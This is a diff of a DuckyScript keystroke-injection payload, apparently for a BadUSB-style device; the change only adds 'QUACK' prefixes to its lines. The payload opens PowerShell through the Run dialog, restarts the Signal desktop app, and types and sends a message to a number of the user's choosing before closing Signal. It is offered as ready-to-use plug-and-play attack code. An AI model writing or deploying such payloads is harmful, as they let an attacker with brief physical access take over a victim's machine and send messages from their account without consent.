@@ -15,35 +15,35 @@
 * Payload Plug-And-Play but can be edited as you want the message
 
 
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell
-ENTER
-DELAY 500
-STRING Stop-Process -Name "Signal"
-ENTER
-STRING Start-Process $Env:USERPROFILE\AppData\Local\Programs\signal-desktop\Signal.exe; exit
-ENTER
-DELAY 5000
-TAB
-TAB
-TAB
-ENTER
-DELAY 100
+QUACK DELAY 1000
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING Stop-Process -Name "Signal"
+QUACK ENTER
+QUACK STRING Start-Process $Env:USERPROFILE\AppData\Local\Programs\signal-desktop\Signal.exe; exit
+QUACK ENTER
+QUACK DELAY 5000
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK ENTER
+QUACK DELAY 100
 * REQUIRED - Receiver number
-STRING NUMBER
-DELAY 100
-TAB
-DELAY 100
-ENTER
-DELAY 200
+QUACK STRING NUMBER
+QUACK DELAY 100
+QUACK TAB
+QUACK DELAY 100
+QUACK ENTER
+QUACK DELAY 200
 
 * This is the message that will be sent.
 * You can change it as you want, if you want.
-STRING YOUR_MESSAGE
-ENTER
+QUACK STRING YOUR_MESSAGE
+QUACK ENTER
 
 * Closing Signal App
-DELAY 500
-ALT F4
+QUACK DELAY 500
+QUACK ALT F4
